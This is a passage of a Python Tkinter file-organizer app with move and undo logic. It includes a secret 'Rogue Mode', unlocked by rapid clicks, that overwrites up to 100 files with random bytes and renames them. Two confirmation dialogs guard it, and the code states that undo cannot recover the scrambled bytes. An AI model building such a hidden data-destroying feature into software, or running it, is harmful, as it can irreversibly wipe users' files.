        for tmp_path, orig_src, final_dst in staged:
            try:
                os.makedirs(os.path.dirname(final_dst), exist_ok=True)
                shutil.move(tmp_path, final_dst)
                executed.append((orig_src, final_dst))
                self.log(f"{action_verb}: {self._rel(orig_src, root)}  -->  {self._rel(final_dst, root)}", "ok")
            except Exception as exc:
                self.log(f"ERROR moving to destination {self._rel(final_dst, root)}: {exc}", "err")
                try:
                    shutil.move(tmp_path, orig_src)
                except Exception as restore_err:
                    self.log(f"CRITICAL: Failed to restore temporary file {tmp_path} back to {orig_src}: {restore_err}", "err")
        return executed

    def undo_last_run(self):
        if not self.history:
            self.log("Undo Engine: No previous batch runs available to revert.", "info")
            return
        root = self.folder_path.get().strip()
        last_run = self.history.pop()
        
        # Invert sources and destinations
        reverse_pairs = [(dst, src) for src, dst in last_run]
        self._apply_rename_pass(reverse_pairs, root, "RESTORED")

        # Cleanup empty category subfolders
        for cat in ALL_CATEGORIES:
            cat_dir = os.path.join(root, cat)
            if os.path.isdir(cat_dir):
                try:
                    os.rmdir(cat_dir)
                except OSError:
                    pass

        self.log("--- Undo Operations Complete ---", "info")
        self.scan_folder()

    # Secret Rogue Mode Easter Egg Mechanics
    def _handle_clear_log_click(self):
        self.clear_log_text()
        self.clear_click_times.append(time.monotonic())
        
        # Secret Trigger: 4 clicks within 2.0 seconds
        if len(self.clear_click_times) == ROGUE_CLICKS and (self.clear_click_times[-1] - self.clear_click_times[0]) <= ROGUE_WINDOW:
            self.clear_click_times.clear()
            if self.rogue_active:
                if messagebox.askyesno("Deactivate Rogue Mode", "Deactivate Rogue Mode and restore standard interface?"):
                    self.set_rogue_state(False)
            else:
                if messagebox.askyesno("Rogue Mode Triggered", "Activate Rogue Mode?"):
                    self.set_rogue_state(True)

    def _setup_rogue_theme(self, style):
        if "rogue_theme" in style.theme_names():
            return
        style.theme_create("rogue_theme", parent="clam", settings={
            ".": {"configure": {"background": ROGUE_BG, "foreground": ROGUE_FG, "fieldbackground": ROGUE_FIELD,
                                "troughcolor": ROGUE_FIELD, "bordercolor": ROGUE_EDGE}},
            "TFrame": {"configure": {"background": ROGUE_BG}},
            "TLabelframe": {"configure": {"background": ROGUE_BG, "bordercolor": ROGUE_EDGE}},
            "TLabelframe.Label": {"configure": {"background": ROGUE_BG, "foreground": "#ff6666"}},
            "TLabel": {"configure": {"background": ROGUE_BG, "foreground": ROGUE_FG}},
            "TButton": {"configure": {"background": ROGUE_PANEL, "foreground": ROGUE_FG, "bordercolor": ROGUE_EDGE},
                        "map": {"background": [("active", "#7d151b")]}},
            "Action.TButton": {"configure": {"background": "#8b0000", "foreground": "#ffffff", "bordercolor": "#ff0000",
                                             "font": ("Segoe UI", 10, "bold")},
                               "map": {"background": [("active", "#ff0000")]}},
            "TCheckbutton": {"configure": {"background": ROGUE_BG, "foreground": ROGUE_FG, "indicatorbackground": ROGUE_FIELD}},
            "TRadiobutton": {"configure": {"background": ROGUE_BG, "foreground": ROGUE_FG, "indicatorbackground": ROGUE_FIELD}},
            "TEntry": {"configure": {"fieldbackground": ROGUE_FIELD, "foreground": ROGUE_FG, "bordercolor": ROGUE_EDGE}},
            "TCombobox": {"configure": {"fieldbackground": ROGUE_FIELD, "foreground": ROGUE_FG, "background": ROGUE_PANEL, "arrowcolor": ROGUE_FG}},
            "TSpinbox": {"configure": {"fieldbackground": ROGUE_FIELD, "foreground": ROGUE_FG, "background": ROGUE_PANEL, "arrowcolor": ROGUE_FG}},
            "Treeview": {"configure": {"background": ROGUE_FIELD, "fieldbackground": ROGUE_FIELD, "foreground": ROGUE_FG},
                         "map": {"background": [("selected", ROGUE_EDGE)], "foreground": [("selected", "#ffffff")]}},
            "Treeview.Heading": {"configure": {"background": ROGUE_PANEL, "foreground": ROGUE_FG}},
        })

    def set_rogue_state(self, active):
        self.rogue_active = active
        style = ttk.Style(self)
        if active:
            self._setup_rogue_theme(style)
        
        style.theme_use("rogue_theme" if active else self.normal_theme)
        self.configure(bg=ROGUE_BG if active else NORMAL_BG)
        self.title("Folder Reorganizer & Asset Sorter" + (" [ROGUE MODE ACTIVATED]" if active else ""))

        pal = ROGUE_LOG if active else NORMAL_LOG
        self.log_box.config(bg=pal["bg"], fg=pal["fg"], insertbackground=pal["fg"])
        for tag in ("preview", "ok", "err", "info"):
            self.log_box.tag_config(tag, foreground=pal[tag])

        self.tree.tag_configure("folder", foreground="#ff6666" if active else "#0b5cad")
        self.example_lbl.config(foreground="#ff8888" if active else "#0b5cad")

        if active:
            self.apply_btn.config(text="CAUSE HAVOC")
            self.apply_tip.short = "UNLEASH ROGUE HAVOC"
            self.apply_tip.detail = "Byte-scrambles files internally with random bytes and flattens names. Hard limited to 100 files max."
            self.log("ROGUE MODE ACTIVATED: Renaming configurations overridden. CAUSE HAVOC will scramble internal bytes and flatten filenames.", "err")
        else:
            self.apply_btn.config(text="Apply Changes")
            self.apply_tip.short, self.apply_tip.detail = self.apply_tip_normal
            self.log("Rogue Mode deactivated. Interface restored to standard operational state.", "info")

    def _execute_rogue_run(self, dry):
        root = self.folder_path.get().strip()
        if not os.path.isdir(root):
            messagebox.showwarning("Rogue Execution", "Select a valid folder first.")
            return

        # Scan target files for Rogue flattening
        targets = []
        if self.recursive.get():
            for d, _, files in os.walk(root):
                for f in sorted(files, key=natural_key):
                    p = os.path.join(d, f)
                    if not is_hidden(p):
                        targets.append(p)
        else:
            for f in sorted(os.listdir(root), key=natural_key):
                p = os.path.join(root, f)
                if os.path.isfile(p) and not is_hidden(p):
                    targets.append(p)

        if not targets:
            self.log("Rogue Mode: No accessible files found in directory.", "info")
            return

        # Rogue Safety Cap: Hard limit Rogue Mode execution to max 100 files
        if len(targets) > ROGUE_MAX_FILES:
            msg = f"SAFETY LIMIT EXCEEDED: Target folder contains {len(targets)} files. Rogue Mode is strictly capped at {ROGUE_MAX_FILES} files to prevent system destruction."
            self.log(msg, "err")
            messagebox.showwarning("Rogue Safety Cap Exceeded", msg)
            return

        if dry:
            self.log(f"--- ROGUE PREVIEW (DRY RUN): {len(targets)} files queued for byte corruption & flattening ---", "err")
            for i, src in enumerate(targets, start=1):
                ext = os.path.splitext(src)[1]
                dst = os.path.join(os.path.dirname(src), f"asset_{i}{ext}")
                self.log(f"Rogue Target: {self._rel(src, root)}  -->  {self._rel(dst, root)} (Bytes will be randomized)", "preview")
            return

        # Double Confirmation Lock
        # First Dialog
        if not messagebox.askyesno("Rogue Mode Lock #1", "Are you sure you want to unleash Rogue Mode?", icon="warning"):
            self.log("Rogue execution aborted at Lock #1.", "info")
            return

        # Second Dialog (Custom Toplevel Modal with required exact text & hover tooltip on Yes button)
        dlg = RogueConfirmDialog(self)
        if not dlg.result:
            self.log("Rogue execution aborted at Lock #2.", "info")
            return

        self.log("--- UNLEASHING ROGUE BYTE-SCRAMBLING & FLATTENING ---", "err")

        # Rogue Execution Pass: Byte Scrambling & Flattening
        flatten_plan = []
        for i, src in enumerate(targets, start=1):
            ext = os.path.splitext(src)[1]
            dst = os.path.join(os.path.dirname(src), f"asset_{i}{ext}")

            # 1. Byte-scrambling hazard: overwrite binary content with random bytes safely
            try:
                sz = os.path.getsize(src)
                with open(src, "wb") as f:
                    f.write(os.urandom(sz if sz > 0 else 64))
                self.log(f"SCRAMBLED BYTES: {self._rel(src, root)} ({sz} bytes randomized)", "err")
            except Exception as exc:
                self.log(f"SKIPPED SCRAMBLE: {self._rel(src, root)} (File write locked / read-only: {exc})", "err")
                continue

            if os.path.normcase(src) != os.path.normcase(dst):
                flatten_plan.append((src, dst))

        # 2. Flatten filenames sequentially into asset_1, asset_2, etc.
        if flatten_plan:
            done = self._apply_rename_pass(flatten_plan, root, "FLATTENED")
            if done:
                self.history.append(done)

        self.log("CRITICAL: Rogue Mode byte scrambling completed! Note: Undo button CANNOT recover scrambled internal bytes.", "err")
        self.scan_folder()

    def _rel(self, path, root):
        try:
            return os.path.relpath(path, root)
        except ValueError:
            return path

    def log(self, message, tag="info"):
        self.log_box.config(state="normal")
        self.log_box.insert("end", message + "\n", tag)
        self.log_box.see("end")
        self.log_box.config(state="disabled")

    def clear_log_text(self):
        self.log_box.config(state="normal")
        self.log_box.delete("1.0", "end")
        self.log_box.config(state="disabled")


if __name__ == "__main__":
    app = FolderReorganizerApp()
    app.mainloop()